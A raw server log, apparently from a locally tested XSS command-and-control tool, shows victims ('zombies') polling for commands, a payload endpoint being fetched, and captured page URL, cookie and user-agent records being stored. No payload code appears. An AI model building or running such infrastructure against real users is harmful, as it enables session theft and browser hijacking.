2025-06-25 00:14:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0025s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:13 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:16 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:16] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:16 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:16 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:16.534Z"}', None, '2025-06-25 00:14:16.541246', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0029s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:16] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:17 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:17] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:17 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:17 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:17.985Z"}', None, '2025-06-25 00:14:17.992964', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0025s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:17] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:18 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:18 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:18 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:18.161Z"}', None, '2025-06-25 00:14:18.165396', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0021s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:18 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:18 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:18 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:18.471Z"}', None, '2025-06-25 00:14:18.476759', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:18 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:18 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:18 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:18.627Z"}', None, '2025-06-25 00:14:18.632766', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0027s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:18 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:18 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:18 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:18.782Z"}', None, '2025-06-25 00:14:18.785943', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:18 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:18 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:18 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:18.942Z"}', None, '2025-06-25 00:14:18.946082', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:18] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:14:19 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:14:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:14:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:19] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:14:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:14:19 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:14:19 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:14:19.095Z"}', None, '2025-06-25 00:14:19.099684', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:14:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0024s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:14:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:19] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:14:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:14:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:14:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:14:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:14:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:14:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
